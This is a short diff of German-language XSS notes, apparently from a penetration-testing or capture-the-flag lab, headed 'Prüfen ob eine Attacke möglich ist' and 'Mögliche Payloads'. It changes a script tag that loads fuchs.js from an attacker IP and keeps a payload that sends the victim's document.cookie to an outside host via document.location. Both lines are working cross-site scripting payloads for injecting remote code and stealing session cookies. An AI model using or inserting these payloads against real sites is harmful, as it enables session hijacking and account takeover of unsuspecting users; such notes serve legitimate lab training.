@@ -1,8 +1,9 @@
 # XSS
 ## Prüfen ob eine Attacke möglich ist
 ```html
-<script src="http://10.10.14.4/fuchs.js"></script>
+<script src="http://10.10.14.18/fuchs.js"></script>
 ```
+
 
 ## Mögliche Payloads
 
@@ -10,6 +11,4 @@
 ```js
 document.location = 'http://10.10.14.4/' + document.cookie;
 ```
-
-
 
